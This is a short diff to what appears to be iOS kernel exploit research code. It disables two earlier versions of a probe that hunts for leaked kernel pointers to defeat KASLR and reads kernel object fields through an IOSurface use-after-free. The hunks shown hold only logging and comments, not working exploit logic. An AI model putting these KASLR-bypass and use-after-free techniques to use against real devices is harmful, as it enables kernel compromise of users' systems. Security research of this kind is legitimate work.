@@ -14472,7 +14472,8 @@ static void r350_probe(void) {
  *
  * Any kernel pointer found gives us: kslide = leaked_ptr - known_offset
  */
-/* r356: Hunt for SLID kernel text pointers across all readable VM regions */
+#if 0 /* disabled: superseded by r356 diff scan below */
+/* r356 v1: Hunt for SLID kernel text pointers across all readable VM regions */
 static void r356_probe(void) {
     rlog("\n=== r356: Slid Kernel Text Pointer Hunt ===\n\n");
     rlog("  Unslid text base: 0xFFFFFFF007004000\n");
@@ -14706,7 +14707,10 @@ static void r356_probe(void) {
     #undef IS_SLID_TEXT
 }
 
-/* r356: Cross-launch correlation + IOSurface UAF kernel object field read */
+#endif /* end disabled r356 v1 */
+
+#if 0 /* disabled: superseded by r356 diff scan below */
+/* r356 v2: Cross-launch correlation + IOSurface UAF kernel object field read */
 static void r356_probe(void) {
     rlog("\n=== r356: Cross-Launch Correlation + IOSurface UAF Kernel Read ===\n\n");
     fflush(stdout);
@@ -15008,6 +15012,8 @@ r356_done:
     rlog("\n=== r356 complete ===\n");
     fflush(stdout);
 }
+
+#endif /* end disabled r356 v2 */
 
 /* r356: Pure diff scan + cross-launch correlation via /tmp state file */
 static void r356_probe(void) {
